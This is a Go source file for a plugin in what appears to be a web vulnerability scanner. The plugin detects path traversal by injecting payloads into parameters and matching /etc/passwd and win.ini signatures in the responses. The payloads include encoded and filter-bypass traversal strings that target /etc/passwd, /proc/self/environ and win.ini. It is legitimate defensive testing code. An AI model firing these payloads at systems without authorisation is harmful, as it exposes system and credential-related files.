package plugins

import (
	"agentdast/internal/core"
	"agentdast/pkg/types"
)

// PathTraversalPlugin detects directory traversal by reading well-known system files.
type PathTraversalPlugin struct{}

func (p *PathTraversalPlugin) Name() string             { return "path_traversal" }
func (p *PathTraversalPlugin) Category() string         { return "injection" }
func (p *PathTraversalPlugin) Severity() types.Severity { return types.SeverityHigh }
func (p *PathTraversalPlugin) Description() string {
	return "Detects path/directory traversal by requesting well-known system files via ../ sequences"
}

func (p *PathTraversalPlugin) DefaultPayloads() []string {
	return []string{
		// plain traversal
		"../../../../etc/passwd",
		"../../../../../../../../etc/passwd",
		// filter bypass: stripped "../" reconstructed
		"....//....//....//....//etc/passwd",
		// URL-encoded and double-encoded
		"..%2f..%2f..%2f..%2fetc%2fpasswd",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"..%252f..%252f..%252fetc%252fpasswd",
		// overlong UTF-8 encoding of '/'
		"..%c0%af..%c0%af..%c0%afetc/passwd",
		// null-byte truncation (legacy stacks)
		"../../../../etc/passwd%00",
		// absolute paths and scheme
		"/etc/passwd",
		"file:///etc/passwd",
		"/proc/self/environ",
		// Windows
		"..\\..\\..\\..\\windows\\win.ini",
		"..%5c..%5c..%5cwindows%5cwin.ini",
	}
}

var traversalSignatures = []string{
	"root:x:0:0:",
	"daemon:x:",
	"[fonts]",
	"; for 16-bit app support",
}

func (p *PathTraversalPlugin) Test(ctx *core.ScanContext) []types.Finding {
	var findings []types.Finding
	for _, param := range ctx.Params() {
		for _, payload := range p.DefaultPayloads() {
			if ctx.Ctx.Err() != nil {
				return findings
			}
			log := ctx.Inject(param, payload)
			if log.Error != "" {
				continue
			}
			if sig, ok := matchSignal(log.ResponseBody, payload, traversalSignatures); ok {
				findings = append(findings, types.Finding{
					Title:       "Path traversal in parameter " + param.Name,
					Endpoint:    ctx.Endpoint.Path,
					Method:      ctx.Endpoint.Method,
					ParamName:   param.Name,
					ParamIn:     param.In,
					Payload:     payload,
					Evidence:    "matched system-file signature: " + sig + "\n" + evidence(log),
					Confidence:  types.ConfidenceConfirmed,
					Description: "A traversal sequence returned contents of a system file, indicating unsanitized file path handling.",
					Remediation: "Canonicalize and validate paths against an allow-list; never build file paths from raw user input.",
					RequestLog:  logForMode(ctx, log),
				})
				break
			}
		}
	}
	return findings
}
